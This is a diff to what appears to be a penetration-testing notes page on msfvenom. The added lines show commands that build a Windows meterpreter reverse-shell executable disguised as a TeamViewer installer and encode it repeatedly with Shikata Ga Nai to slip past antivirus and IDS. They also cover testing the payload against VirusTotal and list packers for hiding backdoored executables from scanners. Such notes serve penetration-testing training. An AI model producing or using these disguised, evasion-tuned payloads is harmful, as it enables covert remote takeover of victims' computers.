@@ -11,6 +11,8 @@ tags:
 
 # msfvenom
 
+MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.
+
 You can generate a webshell by using  msfvenom
 
 ```bash
@@ -77,6 +79,47 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x
 # -f: format for the output file
 ```
 [More about DLL highjacking in thick client applications](thick-applications/tca-attacking-thick-clients-applications.md#how-is-dll-hijacking-perform).
+
+
+### crafting a .exe file with Shikata Ga Nai encoder
+
+```bash
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
+
+# -e: chosen encoder 
+```
+
+Shikata Ga Nai encoder will be most likely detected by AV and IDS/IPS. One better option would be to try running it through multiple iterations of the same Encoding scheme:
+
+```bash
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
+```
+
+But, still, we could be getting detected.
+
+
+## Module msf-virustotal
+
+ Alternatively, Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.
+ 
+```bash
+msf-virustotal -k <API key> -f TeamViewerInstall.exe
+```
+
+
+## Packers
+
+The term `Packer` refers to the result of an `executable compression` process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.
+
+A list of popular packer software:
+
+| | | |
+|---|---|---|
+|[UPX packer](https://upx.github.io)|[The Enigma Protector](https://enigmaprotector.com)|[MPRESS](https://www.matcode.com/mpress.htm)|
+|Alternate EXE Packer|ExeStealth|Morphine|
+|MEW|Themida||
+
+If we want to learn more about packers, please check out the [PolyPack project](https://jon.oberheide.org/files/woot09-polypack.pdf).
 
 
 ## Mitical attacks
